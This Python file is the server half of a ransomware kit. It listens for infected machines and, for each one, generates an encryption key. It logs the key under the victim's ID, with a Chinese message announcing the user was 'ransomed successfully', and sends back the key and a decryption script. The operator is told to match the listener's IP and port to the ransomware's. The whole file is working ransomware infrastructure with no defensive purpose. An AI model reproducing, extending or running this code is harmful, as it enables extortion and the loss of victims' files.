import os
import socket,threading
from cryptography.fernet import Fernet

class Server():
    def Server_Listen(self,ip,port):
        def thread_connect(Sum):
            cipher_key = Fernet.generate_key()
            userrandom = conn.recv(1024).decode("UTF-8")
            print("\n"+"第"+str(Sum)+"名用户被勒索成功:"+userrandom+":"+str(cipher_key))
            userfile = open(os.path.abspath(os.getcwd())+"\\KeyDatabase\\"+userrandom+".txt","a+")
            userfile.write(userrandom+":"+str(cipher_key))
            userfile.close()
            conn.send(b""+cipher_key)
            Clientdecryption = open(os.path.abspath(os.getcwd())+"\\Aop\\Clientdecryption.py","rb")
            Clientdecryptionread = Clientdecryption.read()
            conn.send(Clientdecryptionread)
            Clientdecryption.close()
            conn.close()
        os.system("CLS")
        self.Hacker()
        global Socket
        Socket = socket.socket()
        Socket.bind((ip,port))
        Socket.listen(100000) #设置最大连接数
        global conn,addr,Sum
        Sum = 1
        while True:
            conn,addr = Socket.accept()
            Threading = threading.Thread(target=thread_connect,args=(Sum,))
            Threading.start()
            Sum+=1
    def start(self):
        self.instructions()
        ip = input("\nPlease enter the listening IP address（请输入监听IP地址）:")
        port = int(input("\nPlease enter a listening port（请输入监听的端口）:"))
        self.Server_Listen(ip,port)

    def Hacker(self):
        print("""
    The hacker server is started successfully!（Hacker服务器启动成功!）
    """)

    def instructions(self):
        print("\nBe sure to listen to the same IP and port as the ransomware, except in the case of proxies.（注意监听的ip和端口要和勒索程序的ip和端口一致,除了代理的情况下.）")
